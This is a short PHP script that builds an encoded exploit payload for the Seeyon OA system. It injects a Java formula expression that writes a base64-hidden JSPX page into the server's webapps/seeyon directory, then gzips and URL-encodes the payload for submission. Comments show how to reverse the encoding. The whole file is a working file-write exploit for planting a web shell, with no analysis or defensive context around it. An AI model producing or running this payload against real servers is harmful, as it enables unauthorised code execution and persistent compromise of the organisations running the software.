<?php
$arrayNam =array('formulaType' =>1 ,
'formulaName'=>'test',
'formulaExpression'=>'String path = "../webapps/seeyon/";
java.io.PrintWriter printWriter2 = new java.io.PrintWriter(path+"seeyonUpdateCache.jspx");
	String shell = "PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgIHZlcnNpb249IjEuMiI+IDxqc3A6ZGlyZWN0aXZlLnBhZ2UgY29udGVudFR5cGU9InRleHQvaHRtbCIgcGFnZUVuY29kaW5nPSJVVEYtOCIgLz4gPGpzcDpzY3JpcHRsZXQ+b3V0LnByaW50KCJFUlIwUiBQQUczIDRPNSIpOyA8L2pzcDpzY3JpcHRsZXQ+IDwvanNwOnJvb3Q+";
	sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
	String decodeString = new String(decoder.decodeBuffer(shell),"UTF-8");
	printWriter2.println(decodeString);
	printWriter2.close();
};test();def static xxx(){',
);
// print_r($arrayNam);
$a= '';
$b= (Object)array();
$c= 'true';
$e=array($arrayNam,$a,$b,$c);
$json = json_encode($e);
echo urlencode(iconv('latin1', 'utf-8',gzencode($json)));
// 解码代码
// $s='string';//arguments值复制到此
// echo gzdecode(iconv('utf-8', 'latin1', urldecode($s)));
?>